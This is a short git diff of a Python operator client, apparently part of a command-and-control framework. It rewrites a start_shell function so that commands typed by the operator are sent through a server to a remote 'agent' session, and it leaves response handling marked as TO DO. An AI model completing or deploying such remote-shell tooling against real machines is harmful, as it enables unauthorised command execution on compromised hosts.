@@ -1,4 +1,5 @@
 import socket
+import cli
 import struct
 import protocol
 import console
@@ -63,19 +64,32 @@ def receive_sessions(operator_socket): # deserialize sessionInfo bytes and displ
 
 
 
-def start_shell(command, session_id):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as operator_socket:
-        try:
-            operator_socket.connect((TARGET_IP, TARGET_PORT))
-            packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, command)
-            operator_socket.sendall(packet_bytes)
-            # NOW NEED TO RECEIVE SERVER RESPONSE HERE
-            ##################
-            ##################
-            ##################
-        except OSError as e:
-            operator_socket.close()
-            return False
+def start_shell(session_id): # here session_id is the current_session variable from dispatcher.py 
+    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        shell_socket.connect((TARGET_IP, TARGET_PORT))
+        # specifying which session should enter the shell mode
+        # shell_start creates a shell and other continues executing commands on that shell and another one exits the shell
+        packet_bytes = protocol.packet_formation(protocol.MESSAGE_SHELL_START, session_id, "")
+        shell_socket.sendall(packet_bytes)
+        print(f"{colors.Style.BRIGHT}{colors.Fore.CYAN}[*]starting shell{colors.Style.RESET_ALL}")
+        print()
+        while True:
+            command = cli.shellPrompt()
+            if command == "back":
+                print(f"{colors.Fore.CYAN}[*] exiting shell")
+                exit_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_EXIT, session_id, "")
+                shell_socket.sendall(exit_packet) # exit shell prompt
+                break
+            data_packet = protocol.packet_formation(protocol.MESSAGE_SHELL_DATA, session_id, command) # create shell command packet structure
+            shell_socket.sendall(data_packet) # send server shell commands 
+            # below is the response given by the agent relayed by the server
+            # TO DO HERE
+            
+    except OSError as e:
+        print(f"{colors.Fore.RED}[!] shell connection closed")
+    finally:
+        shell_socket.close()
 
 
 
